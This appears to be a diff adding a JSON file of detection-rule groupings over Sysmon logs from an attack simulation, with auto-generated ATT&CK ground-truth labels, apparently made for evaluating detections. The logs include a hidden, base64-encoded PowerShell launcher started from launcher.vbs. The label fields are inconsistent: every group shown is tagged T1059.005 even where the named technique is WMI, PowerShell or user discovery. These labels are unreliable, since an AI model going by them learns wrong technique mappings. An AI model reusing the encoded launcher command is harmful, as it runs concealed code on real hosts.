+          "idx": 1838,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:24.941000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1839,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:24.942000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1840,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:24.942000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1841,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:24.943000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1059.005",
+      "gt_technique_name": "System Owner/User Discovery",
+      "gt_tactic": "Execution",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: sample-kw+ctx(T1033,c=1.00)"
+    },
+    {
+      "group_id": "T1047_1508",
+      "rule_technique_id": "T1047",
+      "rule_technique_name": "Windows Management Instrumentation",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 1508,
+        "EventID": 5857,
+        "Image": "nan",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-04 20:10:02.695000+00:00"
+      },
+      "num_events": 8,
+      "event_id_distribution": {
+        "1": 5,
+        "3": 2,
+        "5857": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 72,
+          "EventID": 1,
+          "TimeCreated": "2020-09-04 20:09:55.953000+00:00",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "\"C:\\windows\\System32\\WScript.exe\" \"C:\\Users\\pgustavo\\Desktop\\launcher.vbs\" ",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 259,
+          "EventID": 1,
+          "TimeCreated": "2020-09-04 20:09:57.060000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADg",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 290,
+          "EventID": 1,
+          "TimeCreated": "2020-09-04 20:09:57.074000+00:00",
+          "Image": "C:\\Windows\\System32\\conhost.exe",
+          "CommandLine": "\\??\\C:\\windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 557,
+          "EventID": 3,
+          "TimeCreated": "2020-09-04 20:09:57.186000+00:00",
+          "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1470,
+          "EventID": 3,
+          "TimeCreated": "2020-09-04 20:10:02.673000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1495,
+          "EventID": 1,
+          "TimeCreated": "2020-09-04 20:10:02.686000+00:00",
+          "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+          "CommandLine": "C:\\windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1508,
+          "EventID": 5857,
+          "TimeCreated": "2020-09-04 20:10:02.695000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1819,
+          "EventID": 1,
+          "TimeCreated": "2020-09-04 20:10:24.933000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "\"C:\\windows\\system32\\whoami.exe\"",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1059.005",
+      "gt_technique_name": "Windows Management Instrumentation",
+      "gt_tactic": "Execution",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: sample-kw+ctx(T1047,c=1.00)"
+    },
+    {
+      "group_id": "T1059_72",
+      "rule_technique_id": "T1059",
+      "rule_technique_name": "Command and Scripting Interpreter",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 72,
+        "EventID": 1,
+        "Image": "C:\\Windows\\System32\\wscript.exe",
+        "CommandLine": "\"C:\\windows\\System32\\WScript.exe\" \"C:\\Users\\pgustavo\\Desktop\\launcher.vbs\" ",
+        "TimeCreated": "2020-09-04 20:09:55.953000+00:00"
+      },
+      "num_events": 793,
+      "event_id_distribution": {
+        "12": 407,
+        "7": 312,
+        "13": 52,
+        "11": 7,
+        "1": 5,
+        "5": 2,
+        "23": 2,
+        "17": 2,
+        "10": 1,
+        "3": 1,
+        "22": 1,
+        "18": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 54,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts"
+        },
+        {
+          "idx": 55,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts\\VBSFile_.vbs"
+        },
+        {
+          "idx": 57,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\Windows\\explorer.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 58,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.Fri"
+        },
+        {
+          "idx": 59,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.App"
+        },
+        {
+          "idx": 60,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs"
+        },
+        {
+          "idx": 61,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 62,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 63,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithList"
+        },
+        {
+          "idx": 64,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        },
+        {
+          "idx": 66,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 65,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 67,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.947000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        },
+        {
+          "idx": 68,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.947000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithList"
+        },
+        {
+          "idx": 70,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.948000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}"
+        }
+      ],
+      "gt_technique_id": "T1059.005",
+      "gt_technique_name": "Command and Scripting Interpreter",
+      "gt_tactic": "Execution",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(launcher.vbs,wscript,.vbs)"
+    },
+    {
+      "group_id": "T1059_001_433",
+      "rule_technique_id": "T1059.001",
+      "rule_technique_name": "PowerShell",
+      "confidence": 0.77,
+      "anchor": {
+        "idx": 433,
+        "EventID": 7,
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-04 20:09:57.140000+00:00"
+      },
+      "num_events": 1101,
+      "event_id_distribution": {
+        "12": 408,
+        "7": 312,
+        "10": 97,
+        "4656": 80,
+        "4103": 65,
+        "4663": 64,
+        "13": 52,
+        "11": 7,
+        "1": 5,
+        "5": 2,
+        "22": 2,
+        "23": 2,
+        "17": 2,
+        "400": 1,
+        "3": 1,
+        "18": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 54,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts"
+        },
+        {
+          "idx": 55,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts\\VBSFile_.vbs"
+        },
+        {
+          "idx": 56,
+          "EventID": 10,
+          "TimeCreated": "2020-09-04 20:09:55.941000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 57,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\Windows\\explorer.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 58,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.Fri"
+        },
+        {
+          "idx": 59,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.App"
+        },
+        {
+          "idx": 60,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs"
+        },
+        {
+          "idx": 61,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 62,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 63,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithList"
+        },
+        {
+          "idx": 64,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        },
+        {
+          "idx": 65,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 66,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 67,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.947000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        },
+        {
+          "idx": 68,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.947000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithList"
+        }
+      ],
+      "gt_technique_id": "T1059.005",
+      "gt_technique_name": "PowerShell",
+      "gt_tactic": "Execution",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(powershell)"
+    },
+    {
+      "group_id": "T1059_005_166",
+      "rule_technique_id": "T1059.005",
+      "rule_technique_name": "Visual Basic",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 166,
+        "EventID": 7,
+        "Image": "C:\\Windows\\System32\\wscript.exe",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-04 20:09:56.007000+00:00"
+      },
+      "num_events": 793,
+      "event_id_distribution": {
+        "12": 407,
+        "7": 312,
+        "13": 52,
+        "11": 7,
+        "1": 5,
+        "5": 2,
+        "23": 2,
+        "17": 2,
+        "10": 1,
+        "3": 1,
+        "22": 1,
+        "18": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 54,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts"
+        },
+        {
+          "idx": 55,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts\\VBSFile_.vbs"
+        },
+        {
+          "idx": 57,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\Windows\\explorer.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 58,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.Fri"
+        },
+        {
+          "idx": 59,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.App"
+        },
+        {
+          "idx": 60,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs"
+        },
+        {
+          "idx": 61,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 62,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 63,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithList"
+        },
+        {
+          "idx": 64,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        },
+        {
+          "idx": 66,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 65,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 67,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.947000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        },
+        {
+          "idx": 68,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.947000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithList"
+        },
+        {
+          "idx": 70,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.948000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}"
+        }
+      ],
+      "gt_technique_id": "T1059.005",
+      "gt_technique_name": "Visual Basic",
+      "gt_tactic": "Execution",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(wscript)"
+    },
+    {
+      "group_id": "T1070_004_1094",
+      "rule_technique_id": "T1070.004",
+      "rule_technique_name": "File Deletion",
+      "confidence": 0.5,
+      "anchor": {
+        "idx": 1094,
+        "EventID": 23,
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-04 20:10:00.412000+00:00"
+      },
+      "num_events": 647,
+      "event_id_distribution": {
+        "12": 360,
+        "7": 243,
+        "13": 22,
+        "11": 7,
+        "1": 5,
+        "5": 2,
+        "23": 2,
+        "17": 2,
+        "3": 1,
+        "22": 1,
+        "18": 1,
+        "10": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 54,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts"
+        },
+        {
+          "idx": 55,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts\\VBSFile_.vbs"
+        },
+        {
+          "idx": 57,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\Windows\\explorer.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 58,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.Fri"
+        },
+        {
+          "idx": 59,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.App"
+        },
+        {
+          "idx": 60,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs"
+        },
+        {
+          "idx": 61,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 62,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 64,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        },
+        {
+          "idx": 63,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithList"
+        },
+        {
+          "idx": 65,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 66,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 67,
+          "EventID": 12,
